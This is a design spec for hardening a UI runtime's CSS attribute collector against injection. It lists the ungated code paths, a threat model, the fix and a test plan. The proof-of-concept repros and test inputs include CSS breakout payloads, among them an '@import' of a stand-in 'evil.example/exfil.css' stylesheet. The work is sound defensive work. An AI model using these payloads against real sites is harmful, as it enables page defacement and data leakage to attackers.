# Std.Ui inline / pseudo-rule CSS collector — escaping hardening spec

> Scope: BACKLOG row "Medium / Security hardening / `Std.Ui`'s
> inline/pseudo-rule CSS collector … does not escape value-as-data attrs".
> Design-only pass, 2026-07-10, against current `master`. Every line number
> below was re-verified by direct file reads. This document is exact guidance
> for a future implementation lane — no code was changed by this pass.
>
> **Relationship to `#105 Std.Css hardening`
> (`docs/architecture/class10-ui-html-fix-spec-2026-07-09.md`):** same *class*
> of gap (raw Sky `String` reaching a CSS sink without a rule-breakout gate),
> but a *different surface* — `Std.Css`'s `safeValue`/`raw`/`keyframes` bodies
> vs. `Std.Ui`'s `build_style_string` attribute collector. The two are
> genuinely independent code paths; see §5 for the land-together-or-not
> recommendation.

## 1. Summary of findings

| Sink | Context | Currently gated? | Severity |
|---|---|---|---|
| `build_style_string` → inline `style="…"` | HTML attribute value, `escape_attr`-escaped downstream | Raw-string arms UNGATED; `"`/`<`/`&` neutralised by `escape_attr`, but `;` passes | Low (same-element declaration injection only) |
| `build_style_string` → `AttrPseudoRule` css → `data-sky-pc-rules` → `build_pc` → `<style>` HRaw block | Raw `<style>` rule body, only `strip_style_close` applied | Raw-string arms UNGATED; `}` / `{` / `;` / `@import` all pass | **High (page-wide CSS injection)** |

The core defect: `build_style_string`
(`runtime/src/sky_runtime/ui/render.rs:74-278`) formats several
attribute variants whose payload is a raw Sky-level `String` directly into
the CSS string with `format!` and **no** `SafeCssValue` gate. Some sibling
arms (`AttrStyle`, `AttrBgGradient`, `AttrGridTracks`) already route their
value through `SafeCssValue::parse` and drop on failure — the vulnerable arms
are the ones that were never wired to that gate.

This was latent-but-low-severity while the only consumer of
`build_style_string` was the inline `style="…"` attribute (HTML-escaped, one
element's own declarations). Wiring `Ui.onPseudo`
(`runtime/src/sky_runtime/ui/helpers.rs:1289-1291`,
`ui_on_pseudo_` — `Attribute::AttrPseudoRule(pc, build_style_string(&attrs))`)
promoted the *same* collector output into a `<style>`-block context via
`collect_html_attrs` → `data-sky-pc-rules` (`render.rs:337-351`) →
`live/style_inject.rs::build_pc` (`:209-238`). That path emits the css into a
`<style>` HRaw body defended **only** by `strip_style_close`
(`css_safety.rs:195-209`), which strips `</style` but does nothing about
`}` / `{` / `;` / `@import`. So a raw string containing `}` breaks out of the
sky-id-scoped rule and injects arbitrary page-wide selectors.

## 2. Root cause — exact vulnerable arms

`build_style_string` (`runtime/src/sky_runtime/ui/render.rs`). The
`Attribute` variant payload types are from
`runtime/src/sky_runtime/ui/element.rs`:

| Arm (render.rs line) | Payload type (element.rs) | Emitted CSS | Gated? |
|---|---|---|---|
| `AttrFontFamily(f)` (`:159-161`) | `String` (`element.rs:146`) | `font-family:{f}` | **NO** |
| `AttrFontDecoration(d)` (`:171-173`) | `String` (`:150`) | `text-decoration:{d}` | **NO** |
| `AttrFontAlign(a)` (`:180-182`) | `String` (`:153`) | `text-align:{a}` | **NO** |
| `AttrBorderStyle(s)` (`:220-222`) | `String` (`:161`) | `border-style:{s}` | **NO** |
| `AttrOverflow(x, y)` (`:238-241`) | `(String, String)` (`:165`) | `overflow-x:{x}`;`overflow-y:{y}` | **NO** |
| `AttrTransition(t, _)` (`:242-244`) | `(String, bool)` (`:167`) | `transition:{t}` | **NO** |
| `AttrAnimation(name, spec, …)` (`:258-265`) | `(String, String, String, bool)` (`:169`) | `animation:{name} {spec}` | **NO** |
| `AttrBgImage(url)` (`:186-193`) | `String` (`:155`) | `background-image:url({url})` | PARTIAL — `is_dangerous_url_scheme` (scheme prefix only; no `)` / `;` / `}` breakout gate) |

Arms that are already safe and must stay unchanged:

- Numeric arms (`AttrWidth`/`Height`/`Padding`/`Spacing`/`FontSize`/
  `FontWeight`(`i64`)/`FontLetterSpacing`/`FontWordSpacing`/`BorderWidth`/
  `BorderWidthEach`/`BorderRounded`/`BorderShadow`/`BorderInsetShadow`) —
  values come from Rust integers via `length_css` / direct `{n}`; no
  attacker-controlled string.
- Color arms (`FontColor`/`BgColor`/`BorderColor`) — `color_css` emits
  `rgba(<ints>)`.
- Constant-string arms (`AlignX`/`AlignY`/`Pointer`/`FontItalic`/
  `FontUnderline`, `__col`/`__row`/`__wrappedrow`/`__grid` markers) — the
  string is a compile-time literal chosen by the match, never user input.
- Already-gated arms: `AttrStyle` (`SafeCssPropertyName` + `SafeCssValue`,
  `:143-147`), `AttrBgGradient` (`SafeCssValue`, `:199-201`),
  `AttrGridTracks` (`SafeCssValue`, `:248-256`).

`AttrClass` is not a `build_style_string` concern — it is handled in
`collect_html_attrs` (`:304-306`) and lands in an HTML `class="…"` attribute
value where `escape_attr` neutralises breakout; it never enters the CSS
collector (the `build_style_string` match routes it to the no-op group at
`:270`).

## 3. Threat model

### 3.1 What the gap allows, primitive by primitive

| Primitive | Inline `style="…"` path | Pseudo `<style>` path (`onPseudo`) |
|---|---|---|
| `</style>` tag breakout | Closed — `escape_attr` turns `<` into `&lt;` in the attribute value | Closed — `strip_style_close` removes `</style` (fixpoint, case-insensitive) |
| `"` attribute breakout | Closed — `escape_attr` → `&#34;` | N/A (no surrounding attribute; value is HRaw text) |
| `;` declaration injection | **OPEN** — but confined to the *same element's* inline declarations; low severity, no script sink in modern CSS | **OPEN** — injects extra declarations into the scoped rule |
| `}` rule breakout → new selectors | Inert (no rule context in an inline `style`) | **OPEN — HIGH** — closes the sky-id-scoped `{ … }` and opens attacker-chosen selectors/rules affecting the whole page |
| `{` + selector prelude | Inert inline | **OPEN — HIGH** — pairs with `}` for full ruleset injection |
| `@import url(evil.css)` | Inert inline (`@import` only valid at stylesheet top) | **OPEN — HIGH** — once broken out of the rule via `}`, `@import` pulls remote CSS |
| `expression(…)` / `url(javascript:…)` | Legacy-IE script sink | Legacy-IE script sink; also blocked by `SafeCssValue` where it is applied, but the vulnerable arms bypass it |

The inline path is genuinely low-severity (an attacker who controls
`Font.family` on an element can only add declarations to *that same
element's* inline style — a defacement, not a cross-element/script vector,
and `"`/`<` are already escaped). The **high-severity** hole is the pseudo /
`<style>` path, newly reachable through `Ui.onPseudo`.

### 3.2 Concrete `.sky`-level repros

**Repro A — page-wide rule injection via `Font.family` through `onPseudo`.**
User-controlled text (e.g. a profile "preferred font" field) flows into
`Font.family` inside an `onPseudo` list:

```elm
-- attacker-supplied value for `userFont`:
--   sans-serif } body { display:none } .x:hover {
view model =
    Ui.el
        [ Ui.onPseudo Ui.hover
            [ Font.family model.userFont ]     -- <- untrusted String
        ]
        (Ui.text "hover me")
```

`build_style_string [AttrFontFamily "sans-serif } body { display:none } .x:hover {"]`
yields the css fragment
`font-family:sans-serif } body { display:none } .x:hover {`. That becomes the
`data-sky-pc-rules` value `h|font-family:sans-serif } body { … }`, and
`build_pc` emits:

```css
@media (hover: hover) { [sky-id="r_0_el"]:hover { font-family:sans-serif } body { display:none } .x:hover { } }
```

The injected `body { display:none }` rule now applies to the entire page —
a full-page denial-of-view. `strip_style_close` never fires (no `</style`),
`SafeCssValue` is never consulted for this arm.

**Repro B — remote stylesheet load via `@import` through `Background.image`
in `onPseudo`.** `Background.image` builds `AttrBgImage`, whose only gate is
the *scheme* check — it does nothing about `)` closing `url(` early:

```elm
-- attacker value for `userBg`:
--   x) } @import url("https://evil.example/exfil.css") ; .y:hover { background:url(x
view model =
    Ui.el
        [ Ui.onPseudo Ui.hover
            [ Background.image model.userBg ]  -- <- untrusted String
        ]
        content
```

`background-image:url(x) } @import url("https://evil.example/exfil.css") ; .y:hover { background:url(x)`
breaks out of the scoped rule and injects a page-level `@import`, loading
attacker CSS (font/background side-channels, layout exfiltration of
`:visited`/attribute values via selector-driven background requests).

Both repros require only that untrusted text reach a value-as-data attribute
inside an `onPseudo` (or any future consumer of `build_style_string` that
routes into a `<style>` sink) — no compiler bug, well-typed Sky.

## 4. Fix mechanism

### 4.1 Reuse `SafeCssValue`, do not write a second encoder

The repo already mandates "one policy, one place" for CSS safety
(`css_safety.rs` header; design §Q5 "three producers, two shared encoders,
zero new ones"). `SafeCssValue::parse` (`css_safety.rs:64-111`) rejects
exactly the breakout set this gap needs: `;` `{` `}` `</` `/*` `@import`
plus the script sinks (`expression(`, `javascript:`, `url(data:text…`, …).
Its charset is otherwise permissive, so **legitimate CSS values pass
untouched**: `font-family` stacks (`"Helvetica Neue", Georgia, serif` —
commas, quotes, spaces all allowed), `transition: all 200ms ease-in-out`,
`text-align: center`, `border-style: dashed`, `animation: fadeIn 300ms
ease`, `overflow: auto`. None of these legitimately contain `;` `{` `}`
`@import`, so false-positive rate is effectively zero.

**Do not add a new escaping routine.** The `Std.Ui` collector's context
(property *values* inside declarations) is exactly the context
`SafeCssValue` was built for (it already gates `AttrStyle`'s value,
`AttrBgGradient`, `AttrGridTracks` in this same function). A second
implementation would be the drift `css_safety.rs`'s header explicitly warns
against.

### 4.2 Escape vs. reject → REJECT (fail-closed / drop), matching precedent

Route every vulnerable arm's string through `SafeCssValue::parse` and **drop
the declaration on failure** (`None` ⇒ skip the `parts.push`), exactly as
`AttrStyle` / `AttrBgGradient` / `AttrGridTracks` already do three lines
apart in the same function. This is fail-closed: a value that cannot be
proven safe never reaches the sink. Rationale, in order of weight:

1. **Consistency with the file's established posture.** The already-hardened
   arms in `build_style_string` drop-on-failure. Introducing an *escape*
   path for the new arms would create two divergent behaviours in one match.
2. **`#90`-incident lesson (fail-open cost 4 rounds of failed fixes).** For a
   security boundary, "transform to something plausibly safe" (escape) has a
   larger surface for a subtle bypass than "reject anything not provably
   safe" (drop). CSS value-escaping is deceptively hard — `\`-hex-escaping
   interacts with the very `</style`/comment strippers we rely on
   downstream, and `#105`'s own follow-up is *"reject CSS-hex-escaped values
   in `safeValue`"*, i.e. the repo is actively tightening `safeValue`
   *against* escaped input, not leaning on escaping as a safety mechanism.
   Escaping here would push in the opposite direction.
3. **Zero legitimate loss.** Because the rejected charset (`;{}@import`)
   never appears in a legitimate single-declaration value, dropping costs no
   real content. A drop degrades to "the element uses its inherited font /
   default overflow" — a safe, visible-but-benign fallback — never a blank
   page or a crash.

**Compile-time rejection is not viable.** `Font.family`'s argument is a
runtime `String` (Sky-level value, frequently sourced from user input /
DB / config); the collector runs at render time on already-materialised
`Attribute<M>` values. There is no point at which the compiler can prove the
argument is a literal. The gate must be runtime, at the `format!` site in
`build_style_string` — which is where `SafeCssValue` already sits for the
sibling arms.

### 4.3 Exact per-arm change

For each raw-string arm, wrap the push in a `SafeCssValue::parse` guard.
Illustrative (implementation lane to apply to every row in the §2 table):

```rust
Attribute::AttrFontFamily(f) => {
    if let Some(v) = SafeCssValue::parse(f) {
        parts.push(format!("font-family:{}", v.as_str()));
    }
    // else: drop — same posture as AttrStyle / AttrBgGradient below.
}
Attribute::AttrFontDecoration(d) => {
    if let Some(v) = SafeCssValue::parse(d) {
        parts.push(format!("text-decoration:{}", v.as_str()));
    }
}
Attribute::AttrFontAlign(a) => {
    if let Some(v) = SafeCssValue::parse(a) {
        parts.push(format!("text-align:{}", v.as_str()));
    }
}
Attribute::AttrBorderStyle(s) => {
    if let Some(v) = SafeCssValue::parse(s) {
        parts.push(format!("border-style:{}", v.as_str()));
    }
}
Attribute::AttrOverflow(x, y) => {
    if let Some(v) = SafeCssValue::parse(x) { parts.push(format!("overflow-x:{}", v.as_str())); }
    if let Some(v) = SafeCssValue::parse(y) { parts.push(format!("overflow-y:{}", v.as_str())); }
}
Attribute::AttrTransition(t, _respect) => {
    if let Some(v) = SafeCssValue::parse(t) {
        parts.push(format!("transition:{}", v.as_str()));
    }
}
Attribute::AttrAnimation(name, spec, keyframes, _respect) => {
    let _ = keyframes;
    // Gate the composed `name spec` shorthand as one value.
    let shorthand = format!("{name} {spec}");
    if let Some(v) = SafeCssValue::parse(&shorthand) {
        parts.push(format!("animation:{}", v.as_str()));
    }
}
```

**`AttrBgImage` needs one extra decision (call out to the implementation
lane).** Its payload is a bare URL wrapped by the renderer into
`url({url})`. The remaining breakout beyond the scheme check is a `)`
closing `url(` early, then `}`/`;`/`@import`. Two options:

- **Option BG-1 (recommended, minimal):** keep `is_dangerous_url_scheme`,
  and additionally run `SafeCssValue::parse` on the *composed*
  `format!("url({url})")` string, dropping on failure. This closes `)`+`}`
  breakout because the composed value then contains `}`/`;` which
  `SafeCssValue` rejects. **Known limitation:** a legitimate base64 *data
  URI* background (`url(data:image/png;base64,…)`) contains `;base64` and
  would be dropped by the `;` rule. This is acceptable — `Background.image`
  overwhelmingly takes a path/URL, not an inline data URI, and `AttrBgColor`
  / gradients cover the common inline cases. Document the limitation.
- **Option BG-2 (preserves data URIs, small divergence):** emit
  `background-image:url("<escaped>")` with the URL wrapped in double quotes
  and internal `"` / `\` / newline backslash-escaped, keeping the scheme
  check. Quoting means `)` no longer terminates `url(`, so brace/semicolon
  breakout is closed *and* `;base64` survives inside the quoted string. This
  is a documented sanctioned divergence from Go's unquoted `url(<url>)`
  (security outranks byte-for-byte parity — same rationale already recorded
  for `strip_style_close` being stronger than Go).

Recommendation: ship **BG-1** now (simplest, reuses the shared gate, no new
escaping code) and note data-URI backgrounds as unsupported-through-Ui; open
a follow-up only if a real example needs inline data-URI backgrounds, at
which point BG-2 is the upgrade. Do **not** hand-roll a bespoke URL escaper
in this fix.

### 4.4 Why not gate at `build_pc` instead?

`build_pc` (`style_inject.rs:209-238`) receives the css as an already-joined
opaque string (`tag|css` wire format) — it cannot re-parse individual
declarations to know where a value ends, so it could only blunt-force the
whole rule body (which would also corrupt legitimate `{`/`}` in `@media`
wrappers built elsewhere). The correct, surgical gate is at the point where
each *value* is still a discrete `String` — i.e. `build_style_string`. Gating
there fixes both the inline path and the pseudo path at once (single choke
point), which is why the fix belongs in `render.rs`, not `style_inject.rs`.
`strip_style_close` in `build_pc` stays as defence-in-depth for the
`</style` primitive (unchanged).

## 5. Scope boundary — this fix vs. `#105`

**Recommendation: land independently of `#105`.** They touch disjoint files
and disjoint code paths:

- This fix: `runtime/src/sky_runtime/ui/render.rs` (`build_style_string`
  arms) only — plus tests. It *reuses* `css_safety.rs`'s existing
  `SafeCssValue` with **no change** to that module.
- `#105`: `crates/skyc/stdlib/Std/Css.sky` (`raw`/`keyframes` `@import`
  gating) + `runtime/src/sky_runtime/css_safety.rs` (reject CSS-hex-escaped
  values inside `safeValue`). That is a *different producer surface*
  (`Std.Css` stylesheets) and *modifies* the shared encoder.

There is one soft coupling to note but not to block on: if `#105`'s
"reject CSS-hex-escaped values in `safeValue`" lands as a tightening of the
shared `SafeCssValue::parse`, this fix automatically inherits the stronger
check (it calls the same function). That is a benefit, not a dependency —
this fix is correct against `SafeCssValue` as it exists today and gets
strictly stronger if `#105` later hardens it. Ordering is free; ship
whichever is ready first. Because this fix does not edit `css_safety.rs`, it
will not merge-conflict with `#105`'s edits to that file.

## 6. Test plan

Follow the repo's golden/unit + `SKY_E2E` conventions (see
`style_inject.rs` `#[cfg(test)]` for the established unit style, and the
Class-10 spec's E2E notes).

### 6.1 Rust unit tests — `build_style_string` (add to `render.rs` tests, using the existing `build_style_string_for_test` harness at `:945-974`)

Rejection (each vulnerable arm, breakout dropped):

1. `AttrFontFamily("serif } body { display:none".into())` ⇒ result does NOT
   contain `}` and does NOT contain `display:none` (declaration dropped).
2. `AttrFontFamily("x;color:red".into())` ⇒ no `;`, no injected `color`.
3. `AttrBorderStyle("solid } .x{color:red".into())` ⇒ dropped.
4. `AttrTransition("all 1s } body{}".into(), true)` ⇒ dropped.
5. `AttrAnimation("a } body {","300ms","".into()…)` ⇒ dropped (composed
   shorthand fails the gate).
6. `AttrOverflow("auto }".into(), "hidden".into())` ⇒ `overflow-x` dropped,
   `overflow-y:hidden` retained (per-component gating).
7. `AttrBgImage("x) } @import url(evil)".into())` ⇒ dropped (BG-1) / quoted
   with `)` inert (BG-2).

Legitimate values (must still render — golden equality):

8. `AttrFontFamily("\"Helvetica Neue\", Georgia, serif".into())` ⇒
   `font-family:"Helvetica Neue", Georgia, serif`.
9. `AttrTransition("all 200ms ease-in-out".into(), true)` ⇒
   `transition:all 200ms ease-in-out`.
10. `AttrFontAlign("center".into())`, `AttrBorderStyle("dashed".into())`,
    `AttrOverflow("auto".into(),"scroll".into())`,
    `AttrFontDecoration("underline".into())` ⇒ emitted verbatim.
11. `AttrAnimation("fadeIn".into(),"300ms ease".into(),"".into(),true)` ⇒
    `animation:fadeIn 300ms ease`.

### 6.2 Rust unit test — end-to-end through the pseudo path

Construct `ui_on_pseudo_(PseudoClass::Hover, vec![AttrFontFamily("s } body{display:none} .x:hover{".into())])`,
run it through `collect_html_attrs` → `apply_style_injections` /
`build_pc`, assert the produced `<style>` body contains no `}` outside the
single scoped rule (specifically: no `body{` / `display:none` survives) and
still contains `:hover` + `@media (hover: hover)`. This is the direct
regression for Repro A. Add the `@import` variant (Repro B via
`AttrBgImage`) asserting no `@import` survives in the output.

### 6.3 Golden / example E2E (`SKY_E2E=1`)

Add a fixture exercising `Ui.onPseudo [Font.family "…legit stack…"]` on a
real element and assert (a) `skyc build` + `cargo build` succeed, (b) the
rendered HTML `<style>` block contains the legit `font-family` rule scoped to
the element's sky-id, (c) an adversarial value in the same fixture produces
no page-wide selector. Mirror the `../sky` `70-style-injection` fixture shape
already ported in `style_inject.rs`'s
`fixture70_mediaquery_breakout_probe_neutralised` test — extend it with a
`onPseudo`-value probe rather than only the media-query probe.

## 7. Non-goals / do-not-touch

- Do **not** modify `css_safety.rs` in this fix (that is `#105`'s surface).
- Do **not** weaken or remove `strip_style_close` in `build_pc` — it stays as
  the `</style` defence-in-depth layer.
- Do **not** change the numeric/color/constant arms or the already-gated
  `AttrStyle` / `AttrBgGradient` / `AttrGridTracks` arms.
- Do **not** introduce a compile-time gate — the values are runtime strings.
- Keep the drop-on-failure posture silent (consistent with the existing
  arms); do not surface a runtime error (a dropped decorative declaration
  must never break a page render).
